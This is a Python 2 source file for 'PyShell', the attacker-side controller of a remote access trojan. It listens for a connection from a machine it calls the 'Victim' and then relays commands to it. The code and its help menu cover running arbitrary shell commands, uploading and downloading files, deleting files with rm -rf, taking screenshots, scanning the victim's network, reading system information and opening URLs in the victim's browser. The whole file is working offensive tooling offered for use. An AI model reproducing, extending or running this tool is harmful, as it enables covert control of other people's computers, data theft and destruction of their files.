#!usr/bin/env python2
##############################
#       ( PyShell )          #
# 			     #
# Coded By : Khaled Nassar   #
# Website  : www.knassar.tk  #
# GitHub   : @knassar702     #
##############################
import os,sys,socket,random
from time import sleep

# Whats up developer ^_^
host = sys.argv[1]
port = int(sys.argv[2])
def re():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
try:
	sleep(1)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.bind((host, port))
	s.listen(2)
	print("[+] Connecting")
	c, _ = s.accept()
	sleep(2)
except KeyboardInterrupt:
	print('[!] Listener is stoped ..')
	sys.exit()
except socket.error:
	print('[-] Error [-]')
	sys.exit()
def main():
 while True:
     ask = raw_input('PYSHELL > ')
     if ask[0:5] == 'mkdir':
      c.send(ask+' && pwd\n')
      c.recv(1024)
     elif ask[0:7] == 'meminfo':
      c.send('cat /proc/meminfo')
      print c.recv(1024)
     elif ask[0:7] == 'cpuinfo':
      c.send('cat /proc/cpuinfo')
      print c.recv(1024)
     elif ask == 'kernel_info':
      c.send(ask)
      ab = c.recv(1024)
      print("\n[+] \033[37;1mKernel Version : "+ab)
     elif ask[0:7] == "address":
	c.send("address")
	print c.recv(1024)
     elif ask[0:2] == "ls":
	c.send('ls -l')
	print(c.recv(100000))
     elif ask[0:2] == "cp" or ask[0:2] == "mv" or ask[0:2] == "rm" or ask[0:4] == "echo" :
	c.send(ask)
     elif "cd " == ask or "cd" == ask or "cd  " == ask or "cd   " == ask:
		print('[!] Enter name you file ')
		pass
     elif ask[0:8] == 'xdg-open':
		c.send(ask)
     elif ask[0:8] == 'openfile':
		file=ask.split()[-1]
		c.send('xdg-open '+file)
     elif ask == 'screenshot':
     	c.send('screenshot')
     	print (c.recv(1024))
     elif ask == 'help':
	print ("""

Simple Commands :
	openurl     : open url in Victim Browser
	ls          : show all file
	mkdir       : make new file
	rm -rf      : remove file
	whoami      : show username
	print       : print message in Victim terminal (BG = False)
	pwd         : show your path
	kernel_info : show information about kernal
	cpuinfo     : show information about cpu
	meminfo     : show information about memory
	address     : show address the Victim
	upload      : upload file to victim
	download    : download file from victim
	openfile    : openfile in victim device
	netscan	    : use simple scan to see who is up on the victim network
	screenshot  : Take screenshot from Victim device
""")
     elif ask[0:8] == 'netscan':
		c.send("netscan")
		clinet_dict = []
		sleep(1)
		print("\n* IPs *\n-------")
		while True:
			data=c.recv(100000)
			if data == 'stop':
				break
			clinet_dict.append(data)
		for ip in clinet_dict:
			print str(ip)
		del clinet_dict[:]
     elif ask[0:2] == 'rm':
      c.send(ask+' && pwd\n')
      c.recv(1024)
     elif ask[0:5] == 'rmdir':
      c.send(ask+' && pwd\n')
      c.recv(1024)
     elif ask[0:6] == 'whoami':
      c.send('whoami')
      print (c.recv(1024))
     elif ask[0:8] == "download":
	  l=random.randint(1,100000)
	  c.send('download')
          if c.recv(1024) == 'name':
	     file=raw_input('\n[!] File : ')
	     c.send(file)
             with open(str(l)+'.pyshell', 'wb') as f:
                  while True:
                        data = c.recv(100000000)
                        # write data to a file
                        f.write(data)
                        break
	     print("[+] Done ..")
     elif "upload" in ask[0:6]:
	c.send('upload')
	if c.recv(1024) == 'ok':
		c.send('name')
		try:
			while True:
			    try:
			    	filename=raw_input('\n[!] File : ')
			    except:
				break
			    f = open(filename,'rb')
			    l = f.read(1000000)
			    while (l):
			        c.send(l)
	       			l = f.read(1000000)
	    		    f.close()
			    print('Done sending')
			    break
		except:
			print('[-] Error ... ')
     elif ask[0:1] == ' ' or ask == '':
      main()
     elif ask[0:5] == "print":
		c.send(ask)
     elif ask [0:7]=="openurl":
		url=ask.split()[-1]
		c.send('xdg-open '+url)
     else:
      c.send(ask)
      results = c.recv(10000000)
      if results == 'bacod':
       main()
      print  (results)
try:
    main()
except KeyboardInterrupt:
    print("[!] Connection Clossing")
    sleep(2)
    sys.exit()
except socket.error:
    print("[!] Connection Clossed ")
    sleep(2)
    sys.exit()
